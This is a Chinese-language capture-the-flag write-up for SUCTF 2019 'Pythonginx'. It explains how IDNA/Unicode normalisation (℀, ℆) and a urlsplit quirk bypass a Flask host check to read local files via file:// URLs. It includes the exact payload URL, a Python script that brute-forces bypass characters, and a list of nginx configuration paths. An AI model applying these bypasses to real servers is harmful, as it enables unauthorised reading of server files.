# [SUCTF 2019]Pythonginx

## 知识点

`flask`

`IDNA编码`

`unicode`

## 解题

题目直接给出了源码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

代码审计大概结果是：前两个判断 `host` 是否是 `suctf.cc` ，如果不是才能继续。然后第三个经过了 `decode(‘utf-8’)` 之后传进了 `urlunsplit` 函数，在第三个判断中又必须要等于 `suctf.cc` 才行。

### 1.IDNA编码漏洞

在`unicode`中字符`℀(U+2100)℆`是(`U+2106`)，当`IDNA`处理此字符时，会将`℀`变成`a/c`，因此当你访问此`url`时，`dns`服务器会自动将`url`重定向到另一个网站。如果服务器引用前端`url`时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。

这也就是说我们传入的`url`为`http://evil.c℀.com`在经过上述处理过后便成为了`http://evil.ca/c.com`

接着用这种方法访问`/getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf` 得知`flag`的位置

![alt text](<img/[SUCTF 2019]Pythonginx-1.png>)

然后获取`flag`

![alt text](<img/[SUCTF 2019]Pythonginx-2.png>)

### 2.unicode爆破

可以知道是编码问题，且`urlsplit`和`urlparse`存在漏洞，这里我们直接进行脚本爆破，只要得到第`3`个`if`为真前面`2`个为假即可,[生成Unicode](Scripts/gene_unicode.py)

```python
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass
def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False
if __name__=="__main__":
    get_unicode()
```

![alt text](<img/[SUCTF 2019]Pythonginx-4.png>)

![alt text](<img/[SUCTF 2019]Pythonginx-3.png>)

![alt text](<img/[SUCTF 2019]Pythonginx-5.png>)


1. urlsplit漏洞

 假如我们传入：`file:////www.example.com`,进行了 `list(urlsplit(url))` 函数以后就变成了`['file', '', '//www.example.com', '', '']`。也就是它解析域名块为空了。
但当再执行 `urlunsplit` 时 就会合成为 `file://www.example.com` ，达到绕过的效果


### Nginx重要文件位置
配置文件存放目录：`/etc/nginx`
主配置文件：`/etc/nginx/conf/nginx.conf`
管理脚本：`/usr/lib64/systemd/system/nginx.service`
模块：`/usr/lisb64/nginx/modules`
应用程序：`/usr/sbin/nginx`
程序默认存放位置：`/usr/share/nginx/html`
日志默认存放位置：`/var/log/nginx`
配置文件目录为：`/usr/local/nginx/conf/nginx.conf`


[参考文章](https://mayi077.gitee.io/2020/02/05/SUCTF-2019-Pythonginx/)